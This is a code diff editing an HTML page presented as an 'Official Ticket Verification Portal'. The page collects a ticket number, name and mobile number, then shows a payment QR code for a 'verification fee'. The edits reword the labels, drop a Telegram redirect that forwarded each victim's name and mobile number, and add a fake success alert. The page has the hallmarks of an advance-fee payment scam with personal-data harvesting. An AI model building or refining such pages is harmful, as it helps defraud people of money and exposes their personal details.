@@ -17,7 +17,7 @@
             overflow: hidden; height: 100vh;
         }
 
-        /* New Authentication Verified Badge Look */
+        /* Authentication Verified Badge Style */
         #auth-badge {
             position: fixed; top: 85px; right: -300px;
             background: linear-gradient(135deg, #2e7d32, #4ade80);
@@ -70,7 +70,6 @@
             padding: 14px; border-radius: 12px; color: white; font-size: 16px; outline: none;
             box-sizing: border-box; transition: 0.3s;
         }
-        .animated-input:focus { border-color: var(--gold); background: rgba(255,179,0,0.05); }
         
         .glow-box { animation: borderPulse 2s infinite; font-size: 24px; letter-spacing: 6px; text-align: center; border-width: 2px; }
         
@@ -110,10 +109,10 @@
     <div class="container">
         <div class="card active-view" id="step1">
             <h2 style="margin: 0 0 5px; font-weight: 800; text-align: center;">Ticket Check</h2>
-            <p style="color: #64748b; font-size: 13px; text-align: center; margin-bottom: 25px;">Enter your 5-digit ticket number</p>
+            <p style="color: #64748b; font-size: 13px; text-align: center; margin-bottom: 25px;">Official Ticket Verification Portal</p>
             
             <div class="input-group">
-                <label>Ticket ID</label>
+                <label>Ticket Number (5 Digits)</label>
                 <input type="number" id="ticket-id" class="animated-input glow-box" placeholder="00000" oninput="if(this.value.length > 5) this.value = this.value.slice(0, 5)">
             </div>
 
@@ -128,15 +127,15 @@
         <div class="card hidden-right" id="step2">
             <div class="ticket-badge" id="display-ticket">#00000</div>
             <h2 style="margin: 15px 0 5px; font-weight: 800; text-align: center; font-size: 24px;">Registration</h2>
-            <p style="color: #64748b; font-size: 12px; text-align: center; margin-bottom: 20px;">Enter Customer Details</p>
+            <p style="color: #64748b; font-size: 12px; text-align: center; margin-bottom: 15px;">Enter Customer Details</p>
             
             <div class="input-group">
                 <label>First Name</label>
-                <input type="text" id="fname" class="animated-input" placeholder="e.g. Rahul">
+                <input type="text" id="fname" class="animated-input" placeholder="First Name">
             </div>
             <div class="input-group">
                 <label>Last Name</label>
-                <input type="text" id="lname" class="animated-input" placeholder="e.g. Sharma">
+                <input type="text" id="lname" class="animated-input" placeholder="Last Name">
             </div>
             <div class="input-group">
                 <label>Mobile Number</label>
@@ -152,8 +151,8 @@
             
             <div style="text-align: center;">
                 <p style="font-size: 12px; color: var(--gold); font-weight: bold; margin-bottom: 10px;">OFFICIAL SCANNER</p>
-                <img src="https://i.postimg.cc/FH2Jb2P9/Account-QRCode-Jio-Payments-Bank-8183-DARK-THEME-(1).jpg)](https://postimg.cc/FYVRNn5q" class="qr-code" alt="Scanner">
-                <p style="font-size: 11px; color: #94a3b8; line-height: 1.4;">Scan QR to pay verification fee<br>and send screenshot to Admin.</p>
+                <img src="https://i.postimg.cc/FH2Jb2P9/Account-QRCode-Jio-Payments-Bank-8183-DARK-THEME-1.jpg" class="qr-code" alt="Scanner">
+                <p style="font-size: 11px; color: #94a3b8; line-height: 1.4;">Scan QR to pay verification fee<br>and wait for confirmation.</p>
             </div>
             
             <button class="btn-main" style="background: var(--emerald); color: white; margin-top: 20px;" onclick="finalSubmit()">Submit Payment</button>
@@ -170,11 +169,10 @@
             document.getElementById('loader').style.display = 'block';
 
             setTimeout(() => {
-                // Show badge
                 const badge = document.getElementById('auth-badge');
                 badge.classList.add('slide-in');
                 
-                // Hide badge after 3 seconds
+                // Slide out badge after 3 seconds
                 setTimeout(() => {
                     badge.classList.remove('slide-in');
                 }, 3000);
@@ -202,9 +200,10 @@
         }
 
         function finalSubmit() {
-            const fn = document.getElementById('fname').value;
-            const mb = document.getElementById('mobile').value;
-            window.location.href = "https://t.me/YOUR_USERNAME?text=Official_Verification_Payment_Done_by_" + fn + "_Mobile_" + mb;
+            // Telegram redirect hata diya gaya hai
+            alert("Payment Application Submitted Successfully!\nPlease keep the screenshot of your payment for verification.");
+            // Aap chahein toh yahan page ko reload kar sakte hain:
+            // location.reload();
         }
     </script>
 </body>
